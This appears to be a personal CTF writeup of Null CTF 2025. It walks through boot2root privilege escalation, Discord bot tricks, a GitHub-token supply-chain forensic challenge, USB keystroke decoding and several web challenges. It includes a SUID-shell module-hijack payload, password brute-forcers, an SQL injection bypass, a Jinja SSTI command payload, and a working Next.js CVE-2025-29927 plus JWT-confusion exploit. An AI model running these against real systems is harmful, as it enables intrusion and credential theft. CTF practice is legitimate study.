# :link: Null CTF 2025 - Writeup. Hi there, long time no see my article…

---

*Final scoreboard after ctf end*

Hi there, long time no see my article about CTF writeup. Last week, i participated in the Null CTF 2025 [r0/dev/null](https://ctftime.org/team/398024) team with my team [mc3](https://ctftime.org/team/396362) and secured 20th place. Overall the challenges was pretty good. I have contributed to solving 9 out of 45 challenges across a few categories. Here we go…

### Table of Content

- Misc — My name is Preeveske (481pts, 21 solves)

- Misc — Concord One (413pts, 43 solves)

- Misc — Concord Two (388pts, 49 solves)

- Forensic — Sandworm Strike (498pts, 9 solves)

- Forensic — iuesbitaipsi (261pts, 72 solves)

- Web — s1mple (328pts, 63 solves)

- Web — Codename Neigh 2 (50pts, 106 solves)

- Web — Codename Neigh (50pts, 301 solves)

- Web — Next Jason (50pts, 214 solves)

## Misc — My name is Preeveske

This is boot2root challenge with given credentials stefan:b2hRJVkVr2.

To connect to the server, just SSH to specific port.

### Privilege Escalation to User toma via Vim

After logged in the server with user stefan, the first thing i do is check the sudo right. The sudo right result we can execute /usr/bin/vim as user toma.

GTFOBins are our best friend for boot2root challenge like this. We can spawning an interactive system shell via /usr/bin/vim as user toma.

User toma pwned!

Next, linPEAS is your best friend. You can send the linpeas file via :

>

cat > /tmp/linpeas.sh << ‘EOF’

<paste linpeas content>

EOF

But, i’am lazy right now. Based on the linpeas result, there is cronjob at /etc/cron.d/disk_space.

The cronjob running every minutes as user raul. The cronjob execute python file located at /opt/operators/disk_space.py.

The python disk_space.py file only run subprocess.check_output of binary /usr/bin/df with options -h and save the output to disk_space.txt.

### Privilege Escalation to User Raul via Python Module Hijacking

Because the cronjob execute python file as user Raul with command “./disk_space.py” and inside the python script are import-ing module subprocess.

We can abuse this because the cronjob not execute the python script with absolute path. That’s make the python to load the module from current working directory first as part of sys.path.

As we can see, our user group operators have Write access to /opt/operators directory, so it make possible to hijack subprocess module.

So, let’s hijack subprocess module with create subprocess.py inside the /opt/operators directory.

```
cat > subprocess.py << 'EOF'
#!/usr/bin/python3
import os
def check_output(cmd):
os.system('cp /bin/bash /tmp/bash')
os.system('chmod u+s /tmp/bash')
return True
EOF
```

Just waiting a few minutes and then we have /tmp/bash SUID file as user raul.

User raul pwned!

Let’s check raul home dir.

There is creds.txt.gpg and also the .gnupg folder which is common contains the private key for GPG, it’s needed to decrypt the GPG file.

Before we do, i dont know what is purpose of the creds.txt.gpg if we can decrypt it. So, i check the /etc/passwd file and there’s one more user named tudor.

### Privilege Escalation to User Tudor via Weak GPG Passphrase

So, i asumed if we can decrypt the creds.txt.gpg then decrypted file are some credentials, maybe it is for user tudor or even root?

For better performance to bruteforce the password and decrypt the GPG file, we can execute it on local.

Copy the creds.txt.gpg and .gnupg folder to /tmp and set 777 permissions. So, we can copy it via user stefan.

Then, copy to our local machine.

For GPG bruteforce password script, just vibe code with ChatGPT:

```
#!/bin/bash

GPG_FILE="$1"
WORDLIST="$2"

if [[ -z "$GPG_FILE" || -z "$WORDLIST" ]]; then
echo "Usage: $0 <file.gpg> <wordlist>"
exit 1
fi

if [[ ! -f "$GPG_FILE" ]]; then
echo "Error: GPG file not found!"
exit 1
fi

if [[ ! -f "$WORDLIST" ]]; then
echo "Error: Wordlist not found!"
exit 1
fi

echo "[*] Starting brute-force..."
echo "[*] File: $GPG_FILE"
echo "[*] Wordlist: $WORDLIST"
echo

COUNT=0

while IFS= read -r PASS; do
((COUNT++))
echo -ne "\r[*] Trying password #$COUNT: $PASS"

# Try decrypt silently
echo "$PASS" | gpg -homedir ./.gnupg --batch --yes --pinentry-mode loopback --passphrase-fd 0 \
-o decrypted.txt 2>/dev/null --decrypt "$GPG_FILE"

if [[ $? -eq 0 ]]; then
echo -e "\n\n[+] SUCCESS!"
echo "Password found: $PASS"
echo "Decrypted file saved as: decrypted_output"
exit 0
fi

done < "$WORDLIST"

echo -e "\n[-] Password not found in wordlist."
exit 1
```

User tudor pwned!

### Privilege Escalation to Root via Pattern Matching Bruteforce Password

After logged in as user tudor, the first thing again are check the sudo right.

Based on information above, we can execute the /opt/login.sh script as root user. Let’s check the /opt/login.sh what’s do.

So, the login.sh are doing password comparison. If the user input are not equal the password, then “Invalid password”.

But, the vulnerability is [[ … ]] because in bash it’s doing pattern matching (globbing). That’s mean, we can bruteforce the password with wildcard (*) to match the password.

Here is my bruteforce script:

```
cat > bruteforce_login.sh << 'EOF'
#!/bin/bash

# Character set to try (alphanumeric + common symbols)
charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/~"

password=""

echo "[*] Starting password brute-force..."

while true; do
found=false

# Try each character in the charset
for char in $(echo "$charset" | grep -o .); do
# Test pattern: current password + new character + wildcard
pattern="${password}${char}*"

# Run the sudo command and check output
output=$(sudo /opt/login.sh "$pattern" 2>&1)

if echo "$output" | grep -q "Logged in!"; then
password="${password}${char}"
echo "[+] Found character: '$char' - Current password: '$password'"
found=true
break
fi
done

# If no character matched, we've reached the end
if [ "$found" = false ]; then
echo "[*] Password complete: $password"
break
fi

# Optional: Add a small delay to avoid hammering the system
# sleep 0.1
done

echo ""
echo "[+] Final password: $password"
echo ""
echo "[*] Verifying..."
sudo /opt/login.sh "$password"
EOF
```

User root pwned!

Flag: nullctf{mult1pl3_5t3p5_t0_r00t}

## Misc — Concord One

We must join the Null CTF 2025 discord server. On the server, there is three discord bot:

- CTF Sentinel

- Evil Twin

- Good Twin

For this challenge, the discord bot are CTF Sentinel. Based on challenge hint:

>

We do not provide assistance over voice channels

### Solving Scenario

So, our focus is the voice channel. Look at the ticket channel, we can create temporary voice channel and it handled by CTF Sentinel.

Just click the create temporary voice channel, then join the voice. The voice channel will automatically delete after 2 minutes.

After join the voice channel, we can see the “Open Soundboard”. Just open it and then we can see f_l_a_g perchance.

We can play the f_l_a_g perchance and it sounds like morse code. So, i download the sound.

Decode the audio morse code, and flag found.

Flag: nullctf{mister_morse}

## Misc — Concord Two

For this challenge, the discord bot are Evil Twin. Look at help menu of Evil Twin bot, there is hidden Admin Commands. But, our role on this Null CTF discord server isn’t Admin, so the bot not show the Admin command.

### Solving Scenario

To getting the flag, it is clear we must be an Admin then we can see the hidden Admin commands. So, i create private server that i was an Administrator then invite the Evil Twin bot to my server.

Copy the bot App ID which is 1444804365180207276.

Then, create the invite link.

https://discord.com/oauth2/authorize?client_id=1444804365180207276&permissions=8&scope=bot

The permissions 8 give bot Administrator role. It’s optional to give Admin role because what’s needed is we are the Admin. After that, just type /help command on our private server.

See, the hidden Admin commands shown. Then we can get the flag with /real_flag command.

Flag: nullctf{d4mn_1t_i_f0rg07_t0_d1s4bl3_1nv17e5}

## Forensic — Sandworm Strike

This is threat intel osint combined with malware category. No attachment provided, just decription:

>

*“The Fremen speak of the great sandworms of Arrakis with reverence. They call them Shai-Hulud, the Old Man of the Desert, and see in them a manifestation of God.”*

Note: No attachments is intended. Note 2: The gcloud keys from the sample are not in the target. Please donnot tamper with any GCP instance. Note 3: Not any cloud. AWS, Azure, Alibaba, Vercel, etc.

### Get the Entry Point with OSINT the Author

Because the author of this challenge is chasrk3008, so let’s start with OSINT him. On his discord profile, there is github.

The flow where i was solved is start from author starred malicious repo Sha1-hulud. But, it’s gone right now.

Opened a ticket, author said it was unintended because they saw lots of people struggle to find it through github search. So, the intended solution maybe from github search.

Okay, skip this part and jump to repo where the admin starred which is Sha1-Hulud.

Only one file data.json inside Shai-Hulud repo. If we open it, it has base64 encoded string ZXcwS0lDQWdJQ0p6ZVhOMFpXMGlPaUI3RFFvZ0lDQWdJQ0FnSUNKd2JHRjBabTl5YlNJNklDSnRZV01pTEEwS0lDQWdJQ0….

Decode it using cyberchef, then we found github PAT token and many environment variables. This is Supply Chain Attack typically.

Use the github PAT token for authenticating with Github NiguraKaKuru.

Logged in! let’s start with list all repo.

Wooops, there is one private repo big-money-project. Let’s clone it.

Checking the tree of big-money-project folder, we found malicious workflows named sha1-hulud-migration.yml.

The file contain job name “Send FLAG to webhook”. But, the run command are echo.

Hmm, lets check git log.

Interesting commit, lets check what is it with git show log <commit id>.

The commit contains old sha1-hulud-migration that doing POST leaked env to webhook. Because webhook from user’s input, we can run this workflow and add arguments to our webhook. So, the FLAG will send to our webhook.

Okay, that’s clear. Let’s checkout this commit first, so our sha1-hulud-migration.yml will be replaced with the old one.

Okay, lets push this sha1-hulud-migration.yml only.

All done, let’s run this workflow.

Run completed, let’s check our webhook and flag found.

Flag: nullctf{$h41_hu1ud_c0n$um3$_y0ur_$3cr37$}

## Forensic — iuesbitaipsi

This is common USB Keystroke challenge. Many public writeup explain this.

First, extract all usb HID data and save to file with tshark. The output will be like this.

Next, decode the HID data to ascii. Vibe code is real to solve this one, xD.

### Solver:

```
#!/usr/bin/env python3
import sys

USB_CODES = {
0x04:'a',0x05:'b',0x06:'c',0x07:'d',0x08:'e',0x09:'f',
0x0A:'g',0x0B:'h',0x0C:'i',0x0D:'j',0x0E:'k',0x0F:'l',
0x10:'m',0x11:'n',0x12:'o',0x13:'p',0x14:'q',0x15:'r',
0x16:'s',0x17:'t',0x18:'u',0x19:'v',0x1A:'w',0x1B:'x',
0x1C:'y',0x1D:'z',
0x1E:'1',0x1F:'2',0x20:'3',0x21:'4',0x22:'5',
0x23:'6',0x24:'7',0x25:'8',0x26:'9',0x27:'0',
0x28:'\n',0x2C:' ',0x2D:'-',0x2E:'=',0x2F:'[',
0x30:']',0x33:';',0x34:'\'',0x36:',',0x37:'.',
0x38:'/',
}

SHIFTED = {
'1':'!','2':'@','3':'#','4':'$','5':'%',
'6':'^','7':'&','8':'*','9':'(','0':')',
'-':'_','=':'+','[':'{',']':'}',
';':':',"\'":'"',',':'<','.':'>','/':'?'
}

def decode(mod, code):
if code == 0 or code not in USB_CODES:
return None
ch = USB_CODES[code]

if (mod & 0x02) or (mod & 0x20): # shift keys
if ch.isalpha():
ch = ch.upper()
elif ch in SHIFTED:
ch = SHIFTED[ch]
return ch

def main():
if len(sys.argv) != 2:
print("Usage: python3 decoder.py hid.txt")
sys.exit(1)

out = []
last = None

for line in open(sys.argv[1]):
line = line.strip()
if not line:
continue

try:
data = bytes.fromhex(line.replace(':',''))
except:
continue

if len(data) < 3:
continue

mod = data[0]
key = data[2]
ch = decode(mod, key)

if key != last and ch:
out.append(ch)

if key == 0:
last = None
else:
last = key

print(''.join(out))

if __name__ == "__main__":
main()
```

Flag: nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}

## Web — s1mple

This is Blackbox challenges, we only have login page.

### Vulnerability

- To get logged in the website, we can bypass with SQL Injection (1' or 1=1--)and get Admin user, or

- Guessing default credentials will found user:user.

After logged in, if user is Admin, the dashboard page are not vulnerable to SSTI.

If logged in as user, dashboard directly to /page which is vulnerable to Server Side Template Injection (SSTI). Admin user also can access this page.

No filter for user input, so just input basic SSTI payload. Here is my payload.

```
{{ cycler.__init__.__globals__.os.popen('ls').read() }}py
```

Then, read the flag.

That’s simple like challenge name haha.

Flag: nullctf{1nd33d_1t_w4s_th4t_s1mpl3}

## Web — Codename Neigh 2

This is simple whitebox challenges coded with pony language.

### Vulnerability

The vulnerability are in Request Handler. The application read our Host header and URI path then doing if condition. If Host equal to 127.0.0.1 and URI path not start with flag or /flag, the condition pass and we get the flag.

```
class F is RequestHandler
let _fileauth: FileAuth

new val create(fileauth: FileAuth) =>
_fileauth = fileauth

fun not_starts_with(s: String, prefix: String): Bool =>
(s.size() >= prefix.size()) and (s.substring(0, prefix.size().isize()) != prefix)

fun apply(ctx: Context): Context iso^ =>
var conn: String = ""
var body = "[REDACTED]".array()

try
conn = ctx.request.header("Host") as String
end

let path: String = ctx.request.uri().string()
//body = ("[REDACTED] Path:" + path).array()

if (conn == "127.0.0.1") and not_starts_with(path, "flag") and not_starts_with(path, "/flag") then
let fpath = FilePath(_fileauth, "private/flag.html")
with file = File(fpath) do
body = file.read_string(file.size()).string().array()
end
end

ctx.respond(
StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
body
)
consume ctx
```

So, summary of vulnerability is Host Header Injection and Path Manipulation.

### Solver

```
import requests
from urllib.parse import *

URL = 'http://public.ctf.r0devnull.team:3003/'

class Exploit:
def __init__(self, url=URL):
self.url = url

def getFlag(self):
headers = {"Host": "127.0.0.1"}
req = requests.get(urljoin(self.url, "////public.ctf.r0devnull.team:3003/flag"), headers=headers)
return req.text

if __name__ == '__main__':
run = Exploit()
print(run.getFlag())
```

Flag: nullctf{n0w_w!th_99%_l3ss_un1nt3nd3d_s0lv3s_m4yb3!!!@}

## Web — Codename Neigh

This is first version of codename where is many way to solve.

### Vulnerability

The different between version 1 and version 2 are in if condition. This version only compare the path. But, the version 2 it’s use not_starts_with().

```
class F is RequestHandler
let _fileauth: FileAuth

new val create(fileauth: FileAuth) =>
_fileauth = fileauth

fun apply(ctx: Context): Context iso^ =>
var conn: String = ""
var body = "[REDACTED]".array()

try
conn = ctx.request.header("Host") as String
end

let path: String = ctx.request.uri().string()

if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then
let fpath = FilePath(_fileauth, "public/flag.html")
with file = File(fpath) do
body = file.read_string(file.size()).string().array()
end
end

ctx.respond(
StatusResponse(StatusOK, [("Content-Length", body.size().string())]),
body
)
consume ctx
```

To solved this, i use same exploit.

```
import requests
from urllib.parse import *

URL = 'http://public.ctf.r0devnull.team:3002/'

class Exploit:
def __init__(self, url=URL):
self.url = url

def getFlag(self):
headers = {"Host": "127.0.0.1"}
req = requests.get(urljoin(self.url, "////public.ctf.r0devnull.team:3002/flag"), headers=headers)
return req.text

if __name__ == '__main__':
run = Exploit()
print(run.getFlag())
```

Flag: nullctf{p3rh4ps_my_p0ny_!s_s0mewh3re_3lse_:(}

## Web — Next Jason

This is whitebox challenges, the code more complex than codeneigh, the vulnerability also chain.

### Vulnerability

- CVE-2025–29927 (Next.js) — Authorization Bypass

- JWT Algorithm Confusion

To solved this challenge, flow start from:

- Get public key at /api/getPublicKey endpoint via Next.js Authorization Bypass.

- Generate new JWT token with payload {“username”: “admin”} and sign with public key.

- Get the flag at /api/getFlag.

### Solver

```
import requests
import jwt
from urllib.parse import *

URL = 'http://a370afda41a7.challs.ctf.r0devnull.team:8001/'

########## "Fix" pyjwt
# pyjwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
def prepare_key(self, key):
key = jwt.utils.force_bytes(key)
return key

jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key

class Exploit:
def __init__(self, url=URL):
self.url = url

def getPublicKey(self):
headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}
req = requests.get(urljoin(self.url, "api/getPublicKey"), headers=headers)
return req.json()['PUBKEY']

def keyConfusion(self):
pubkey = self.getPublicKey()
payload = {"username": "admin"}
forgedJWT = jwt.encode(payload, pubkey, algorithm="HS256")
return forgedJWT

def getFlag(self):
headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware", "Cookie": f"token={self.keyConfusion()}"}
req = requests.get(urljoin(self.url, "api/getFlag"), headers=headers)
return req.json()

if __name__ == '__main__':
run = Exploit()
print(run.getFlag())
```

Flag: nullctf{f0rg3_7h15_cv3_h3h_718b30667b15b84a}

## Closing Remarks:

Thank you for reading my writeup. I hope it is helpful to all of you. I apologize for any mistakes in my writing. I appreciate any feedback or suggestions to help me improve in the future.

---
